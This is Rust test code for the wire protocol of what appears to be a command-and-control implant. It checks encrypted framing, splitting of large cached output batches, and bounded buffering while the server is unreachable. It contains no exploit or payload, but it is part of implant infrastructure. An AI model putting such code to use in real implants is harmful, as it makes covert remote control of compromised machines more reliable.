        // Routine mid-flush replies carry an EMPTY task batch — the helper
        // must treat that (and any unusable reply) as "nothing to do", never
        // as a loop-killing error.
        let (key, empty_reply) = make_mid_flush_reply(&[], 7);
        assert_eq!(open_reply_tasks(&key, &empty_reply), Some(vec![]));
        let mut deferred: Vec<Task> = Vec::new();
        defer_reply_tasks(&key, &empty_reply, &mut deferred);
        assert!(deferred.is_empty());

        // Garbage / truncated bodies and frames sealed in the wrong
        // direction (AEAD tag fails) yield no tasks and no panic.
        defer_reply_tasks(&key, b"", &mut deferred);
        defer_reply_tasks(&key, &[0xDE, 0xAD, 0xBE, 0xEF], &mut deferred);
        let wrong_dir = encode_frame_dir(
            &[0x42; 32],
            Direction::ClientToServer,
            9,
            &key,
            &Task::encode_vec(&[Task {
                task_id: 1,
                command: Command::Ping,
            }])
            .unwrap(),
        )
        .unwrap();
        assert!(open_reply_tasks(&key, &wrong_dir).is_none());
        assert!(deferred.is_empty());
    }

    #[test]
    fn frame_prefix_len_splits_over_limit_batch_and_every_prefix_seals() {
        // Wave-3 regression: server 不可达时 pending 缓存跨 cycle 累积，整批
        // encode_frame_dir 超 MAX_CT_LEN（512 KiB）曾传播成致命退出。打包
        // 必须按帧切分，且每个前缀都必须能真实封帧（用真 keypair 验证，而
        // 不只是估算）。
        let implant = ImplantKeypair::generate().unwrap();
        let server = nyx_protocol::ServerKeypair::generate().unwrap();
        let key = implant.session_key(&server.public_bytes()).unwrap();
        let pubkey = implant.public_bytes();

        // ~2.5 MiB 的批次（80 × 32 KiB blob），远超一帧。
        let mk = |i: u64| TaskResponse {
            task_id: i,
            response: Response::Output(vec![b'x'; 32 * 1024]),
        };
        let mut pending: Vec<TaskResponse> = (0..80).map(mk).collect();
        // 先证明旧路径确实会失败：整批封帧超 MAX_CT_LEN。
        assert!(
            encode_frame_dir(
                &pubkey,
                Direction::ClientToServer,
                0,
                &key,
                &encode_batch(&mut pending.clone()),
            )
            .is_err(),
            "whole-batch seal must exceed MAX_CT_LEN (this was the fatal path)"
        );

        let total = pending.len();
        let mut counter = 0u64;
        let mut sent = 0;
        while !pending.is_empty() {
            let n = frame_prefix_len(&pending, PACK_BUDGET);
            assert!((1..=pending.len()).contains(&n));
            let plain = encode_batch(&mut pending[..n]);
            let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, counter, &key, &plain);
            assert!(
                frame.is_ok(),
                "prefix frame must seal (prefix {n} items, {} plaintext bytes)",
                plain.len()
            );
            counter += 1;
            sent += n;
            pending.drain(..n);
        }
        assert_eq!(sent, total, "every cached response must be deliverable");
        assert!(
            counter > 1,
            "a >512 KiB cache must split into multiple frames"
        );
    }

    #[test]
    fn frame_prefix_len_guarantees_progress() {
        // 空批次 → 0；非空批次即使预算再小也至少 1 条（否则 flush 死锁）。
        assert_eq!(frame_prefix_len(&[], PACK_BUDGET), 0);
        let pending = vec![TaskResponse {
            task_id: 1,
            response: Response::Output(vec![0u8; nyx_protocol::wire::MAX_BLOB_LEN]),
        }];
        assert_eq!(frame_prefix_len(&pending, 1), 1);
        // 顶着 MAX_BLOB_LEN 的单条仍在 PACK_BUDGET 内（256 KiB < 511 KiB）。
        assert_eq!(frame_prefix_len(&pending, PACK_BUDGET), 1);
    }

    #[test]
    fn cap_pending_drops_oldest_and_keeps_newest() {
        // server 长期不可达：缓存超保留上限时丢最旧、保最新，不无界增长。
        let mk = |id: u64| TaskResponse {
            task_id: id,
            response: Response::Output(vec![b'y'; 1000]),
        };
        let mut pending: Vec<TaskResponse> = (0..10).map(mk).collect();
        // 每条估算 1024 字节；cap 3072 → 恰好保留最新 3 条。
        let dropped = cap_pending(&mut pending, 3072);
        assert_eq!(dropped, 7);
        assert_eq!(pending.len(), 3);
        assert_eq!(
            pending[0].task_id, 7,
            "survivors must be the newest responses"
        );
        // 已在 cap 内不再丢。
        assert_eq!(cap_pending(&mut pending, 3072), 0);
        assert_eq!(pending.len(), 3);
        // 空批次是 no-op；cap 0 清空全部但不 panic。
        assert_eq!(cap_pending(&mut Vec::new(), 0), 0);
        let mut one = vec![mk(42)];
        assert_eq!(cap_pending(&mut one, 0), 1);
        assert!(one.is_empty());
    }

    #[test]
    fn pending_cache_over_frame_limit_never_fails_seal_after_cap_and_split() {
        // 端到端打包语义（无网络）：模拟 server 不可达期间 pending 累积到
        // 超过一帧——先 cap 再按帧切分，封帧必须始终成功（旧代码在此
        // anyhow! 致命退出）。
        let implant = ImplantKeypair::generate().unwrap();
        let server = nyx_protocol::ServerKeypair::generate().unwrap();
        let key = implant.session_key(&server.public_bytes()).unwrap();
        let pubkey = implant.public_bytes();
        // 900 条小响应 ≈ 921 KB（估算），超一帧但在 PENDING_CAP 内。
        let mut pending: Vec<TaskResponse> = (0..900)
            .map(|i| TaskResponse {
                task_id: i,
                response: Response::Output(vec![b'z'; 1000]),
            })
            .collect();
        let dropped = cap_pending(&mut pending, PENDING_CAP);
        assert_eq!(dropped, 0, "under PENDING_CAP nothing is dropped");
        let n = frame_prefix_len(&pending, PACK_BUDGET);
        assert!(n < pending.len(), "over-limit cache must split");
        let plain = encode_batch(&mut pending[..n]);
        assert!(
            encode_frame_dir(&pubkey, Direction::ClientToServer, 7, &key, &plain).is_ok(),
            "split prefix must always seal"
        );
        // 超过 PENDING_CAP 的累积被截断到上限内。
        let mut huge = pending.clone();
        huge.extend(pending.clone());
        huge.extend(pending.clone());
        huge.extend(pending.clone()); // ≈ 3.7 MB
        huge.extend(pending.clone());
        huge.extend(pending.clone()); // ≈ 5.5 MB > PENDING_CAP
        let dropped = cap_pending(&mut huge, PENDING_CAP);
        assert!(dropped > 0, "over-cap cache must drop oldest");
        let remaining: usize = huge.iter().map(response_wire_size).sum();
        assert!(remaining <= PENDING_CAP);
        // 截断后按帧切分仍可全部封帧交付。
        while !huge.is_empty() {
            let n = frame_prefix_len(&huge, PACK_BUDGET);
            let plain = encode_batch(&mut huge[..n]);
            assert!(encode_frame_dir(&pubkey, Direction::ClientToServer, 0, &key, &plain).is_ok());
            huge.drain(..n);
        }
    }
}
